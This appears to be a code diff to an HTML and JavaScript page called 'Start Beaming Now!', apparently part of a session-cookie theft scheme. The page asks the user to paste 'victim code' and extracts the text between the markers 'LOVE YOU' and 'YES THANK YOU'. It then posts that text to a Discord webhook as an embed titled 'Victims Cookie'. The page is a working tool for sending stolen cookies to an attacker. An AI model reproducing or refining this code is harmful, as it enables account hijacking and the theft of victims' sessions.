@@ -13,15 +13,13 @@
     #messageBar {
       margin-top: 20px;
     }
-    textarea, button {
+    input, button {
       padding: 10px;
       font-size: 16px;
     }
-    textarea {
+    input {
       width: 70%;
       margin-right: 10px;
-      height: 150px; /* Making the input area bigger */
-      resize: none; /* Disable resizing */
     }
     button {
       background-color: #007bff;
@@ -45,7 +43,7 @@
 <body>
   <h1>Start Beaming Now!</h1>
   <div id="messageBar">
-    <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea>
+    <input type="text" id="messageInput" placeholder="Paste the victim code that you copied..." />
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
   <p id="status" style="color: green; font-weight: bold;"></p>
@@ -59,49 +57,66 @@
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
       const errorMessage = document.getElementById("errorMessage");
-      let message = messageInput.value.trim(); // Remove leading and trailing spaces
+      let message = messageInput.value;
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Check if the message is empty
-      if (message === "") {
-        errorMessage.textContent = "Message cannot be blank!";
+      // Check if the message is blank
+      if (!message.trim()) {
+        errorMessage.textContent = "Message failed! Your message cannot be blank.";
         return;
       }
 
-      // Wrap the message in triple backticks (```)
-      message = "```" + message + "```";
+      // Scan for the start and end phrases
+      const startPhrase = "LOVE YOU";
+      const endPhrase = "YES THANK YOU";
 
-      // Create the embed payload
-      const embedPayload = {
-        embeds: [
-          {
-            title: "Victims Cookie", // Embed title
-            description: message, // Embed description
-            color: 16711680, // Embed color (red in this case)
-            timestamp: new Date().toISOString() // Adds a timestamp
-          }
-        ]
-      };
+      // Check if the message contains both start and end phrases
+      if (message.includes(startPhrase) && message.includes(endPhrase)) {
+        // Extract the part of the message between the phrases
+        const startIndex = message.indexOf(startPhrase) + startPhrase.length;
+        const endIndex = message.indexOf(endPhrase);
 
-      // Send the embed to Discord webhook
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embedPayload),
-      })
-        .then((response) => {
-          if (response.ok) {
-            document.getElementById("status").textContent = "Message sent successfully!";
-            messageInput.value = ""; // Clear the input
-          } else {
-            throw new Error("Failed to send the message.");
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          document.getElementById("status").textContent = "Failed to send the message.";
-        });
+        // Get the middle part of the message
+        const middleMessage = message.slice(startIndex, endIndex).trim();
+
+        if (middleMessage) {
+          // Create the embed payload
+          const embedPayload = {
+            embeds: [
+              {
+                title: "Victims Cookie", // Embed title
+                description: `\`\`\`${middleMessage}\`\`\``, // Embed description with the message surrounded by triple backticks
+                color: 16711680, // Embed color (red in this case)
+                timestamp: new Date().toISOString() // Adds a timestamp
+              }
+            ]
+          };
+
+          // Send the embed to Discord webhook
+          fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(embedPayload),
+          })
+            .then((response) => {
+              if (response.ok) {
+                document.getElementById("status").textContent = "Message sent successfully!";
+                messageInput.value = ""; // Clear the input
+              } else {
+                throw new Error("Failed to send the message.");
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              document.getElementById("status").textContent = "Failed to send the message.";
+            });
+        } else {
+          errorMessage.textContent = "Message failed! No valid content found between the start and end phrases.";
+        }
+      } else {
+        errorMessage.textContent = "Message failed! Your message must contain 'LOVE YOU' at the start and 'YES THANK YOU' at the end.";
+      }
     }
   </script>
 </body>
